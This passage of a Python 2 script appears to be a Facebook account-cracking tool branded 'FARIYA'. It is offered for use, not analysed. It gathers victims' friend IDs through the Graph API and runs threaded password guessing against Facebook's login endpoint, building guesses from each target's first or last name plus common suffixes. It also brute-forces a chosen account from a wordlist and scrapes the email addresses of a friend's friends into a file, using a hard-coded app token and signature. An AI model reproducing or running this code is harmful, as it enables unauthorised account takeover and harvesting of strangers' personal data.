        print '\x1b[1;96m[!] \x1b[1;91mFill in correctly'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
    print '\x1b[1;96m[\x1b[1;92m1\x1b[1;96m] \x1b[1;93mHack  ID Friend List'
    print '\x1b[1;96m[\x1b[1;92m2\x1b[1;96m] \x1b[1;93mHack Friends Of Friends List'
    print '\x1b[1;96m[\x1b[1;92m3\x1b[1;96m] \x1b[1;93mHack With File'
    print '\x1b[1;96m[\x1b[1;91m0\x1b[1;96m] \x1b[1;91mBack'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;97m >>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mFill In Correctly'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
            jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mSearching ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
            idt = raw_input('\x1b[1;96m[+] \x1b[1;37mEnter Friend ID Code \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mFriend Name\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print "\x1b[1;96m[!] \x1b[1;91mFriend List  Don't Public!"
                raw_input('\n\x1b[1;96m[\x1b[1;97mBack\x1b[1;96m]')
                super()

            jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mSearching ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
            try:
                idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mInput Name file  \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;96m[!] \x1b[1;91mFile Dont See'
                raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;96m[!] \x1b[1;91mFill In Correctly'
            pilih_super()
        print '\x1b[1;96m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
        time.sleep(0.05)
        jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;96m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;96m] \x1b[1;92mCrack \x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)
            time.sleep(0.05)

    print
    print '\x1b[1;96m[!] \x1b[1;92mStop CTRL+z'
    time.sleep(0.05)
    print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
    print '\x1b[1;96m[\x1b[1;92mO\x1b[1;93mR\x1b[1;96m]  \x1b[1;93m    User ID    \x1b[1;96m| \x1b[1;93mPassword \x1b[1;96m  - \x1b[1;93m ID Name'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
                cek = open('out/super_cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['last_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
                    cek = open('out/super_cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
                        cek = open('out/super_cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = b['last_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
                            cek = open('out/super_cp.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['first_name'] + '1122'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 + ' - ' + b['name']
                                cek = open('out/super_cp.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['last_name'] + '1122'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = b['first_name'] + '786'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
                                        cek = open('out/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = b['last_name'] + '786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 + ' - ' + b['name']
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            pass9 = b['first_name'] + '12345'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 + ' - ' + b['name']
                                                cek = open('out/super_cp.txt', 'a')
                                                cek.write(user + '|' + pass9 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                pass10 = b['last_name'] + '12345'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 + ' - ' + b['name']
                                                    cek = open('out/super_cp.txt', 'a')
                                                    cek.write(user + '|' + pass10 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass10)
                                                else:
                                                    pass11 = '786786'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
                                                        oks.append(user + pass11)
                                                    elif 'www.facebook.com' in q['error_msg']:
                                                        print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 + ' - ' + b['name']
                                                        cek = open('out/super_cp.txt', 'a')
                                                        cek.write(user + '|' + pass11 + '\n')
                                                        cek.close()
                                                        cekpoint.append(user + pass11)
                                                    else:
                                                        pass12 = '000786'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
                                                            print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
                                                            oks.append(user + pass12)
                                                        elif 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 + ' - ' + b['name']
                                                            cek = open('out/super_cp.txt', 'a')
                                                            cek.write(user + '|' + pass12 + '\n')
                                                            cek.close()
                                                            cekpoint.append(user + pass12)
                                                        else:
                                                            pass13 = b['first_name'] + '12'
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass13 + ' - ' + b['name']
                                                                oks.append(user + pass13)
                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass13 + ' - ' + b['name']
                                                                cek = open('out/super_cp.txt', 'a')
                                                                cek.write(user + '|' + pass13 + '\n')
                                                                cek.close()
                                                                cekpoint.append(user + pass13)
                                                            else:
                                                                pass14 = b['last_name'] + '12'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'access_token' in q:
                                                                    print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass14 + ' - ' + b['name']
                                                                    oks.append(user + pass14)
                                                                elif 'www.facebook.com' in q['error_msg']:
                                                                    print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass14 + ' - ' + b['name']
                                                                    cek = open('out/super_cp.txt', 'a')
                                                                    cek.write(user + '|' + pass14 + '\n')
                                                                    cek.close()
                                                                    cekpoint.append(user + pass14)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\x1b[1;97mFARIYA\x1b[1;96m\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2'
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mProcess Complete \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;96m[+] \x1b[1;92mCP File Saved \x1b[1;91m: \x1b[1;97mout/super_cp.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mBack\x1b[1;96m]')
    menu()


def hackingx():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo
        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;93mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;91m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;96mWordlist \x1b[1;97m(Type\xf0\x9f\x91\x89fariyakhan.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
            print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            time.sleep(0.05)
            print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;97mPlease wait \x1b[1;97m...')
            print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' \xe2\x97\x8f ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
                        time.sleep(0.05)
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email
                        time.sleep(0.05)
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw
                        time.sleep(0.05)
                        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
                        print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint :('
                        time.sleep(0.05)
                        print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;91mUsername \x1b[1;93m:\x1b[1;92m ' + email
                        time.sleep(0.05)
                        print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;93m:\x1b[1;92m ' + pw
                        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print '\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist correct name'
            super()


def emailx():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('reset')
        print logo
        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
        idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Friend not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all friend email from friend \x1b[1;97m...')
        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
        bz = open('out/em_teman_from_teman.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                emfromteman.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(emfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            except KeyError:
                pass

        bz.close()
        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSuccessfully get email \x1b[1;97m....'
